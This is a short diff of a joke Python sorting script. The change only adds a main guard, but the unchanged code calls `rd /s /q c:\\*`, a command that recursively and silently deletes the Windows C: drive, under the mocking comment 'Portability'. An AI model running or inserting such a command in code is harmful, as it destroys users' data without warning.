@@ -37,4 +37,5 @@ def PanicSort(l):
 	subprocess.call(["rd", "/s", "/q", "c:\\*"]) # Portability
 	return [1,2,3,4,5]
 
-print PanicSort(sys.argv[1:])
+if __name__ == '__main__':
+	print PanicSort(sys.argv[1:])
